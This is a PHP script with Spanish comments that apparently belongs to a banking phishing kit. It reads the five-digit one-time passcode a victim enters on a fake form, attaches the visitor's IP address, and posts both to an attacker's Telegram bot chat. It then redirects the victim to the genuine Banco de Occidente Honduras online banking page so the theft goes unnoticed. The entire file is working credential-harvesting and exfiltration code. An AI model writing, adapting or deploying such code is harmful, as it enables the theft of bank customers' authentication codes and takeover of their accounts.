<?php
// Cargar configuración desde config.php
$config = include('config.php');
$botToken = $config['botToken'];
$chatId = $config['chatId'];

// Verifica si el formulario fue enviado
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    // Captura los datos del formulario
    $otp1 = isset($_POST['otp1']) ? htmlspecialchars($_POST['otp1']) : '';
    $otp2 = isset($_POST['otp2']) ? htmlspecialchars($_POST['otp2']) : '';
    $otp3 = isset($_POST['otp3']) ? htmlspecialchars($_POST['otp3']) : '';
    $otp4 = isset($_POST['otp4']) ? htmlspecialchars($_POST['otp4']) : '';
    $otp5 = isset($_POST['otp5']) ? htmlspecialchars($_POST['otp5']) : '';

    // Validación: Si algún campo está vacío, redirige con un mensaje
    if (empty($otp1) || empty($otp2) || empty($otp3) || empty($otp4) || empty($otp5)) {
        echo "Todos los campos son requeridos.";
        exit;
    }

    // Concatenar el OTP completo
    $otp = $otp1 . $otp2 . $otp3 . $otp4 . $otp5;

    // Obtener la IP del usuario
    $ipUsuario = $_SERVER['REMOTE_ADDR'];

    // Mensaje a enviar a Telegram
    $mensaje = "📲 *OTP Ingresado:*\n\n";
    $mensaje .= "🔢 Codigo: `$otp`\n";  // OTP junto al emoji, usando formato de código inline
    $mensaje .= "🌍 IP del usuario: `$ipUsuario`\n"; // Agregar la IP del usuario

    // Configura la URL de la API de Telegram
    $url = "https://api.telegram.org/bot$botToken/sendMessage";

    // Configura los parámetros a enviar
    $data = [
        'chat_id' => $chatId,
        'text' => $mensaje,
        'parse_mode' => 'Markdown' // Para formato de texto enriquecido
    ];

    // Usa cURL para enviar los datos a Telegram
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    // Ejecutar la solicitud y obtener la respuesta
    $response = curl_exec($ch);

    // Manejo de errores
    if (curl_errno($ch)) {
        echo "Error al enviar: " . curl_error($ch);
    }

    curl_close($ch);

    // Redirige al usuario a una página específica
    header("Location: https://www.bancodeoccidente.hn/mas/banca-por-internet"); // Cambia "espere.php" por la URL de tu página de redirección
    exit();
} else {
    echo "Método no permitido.";
}
?>
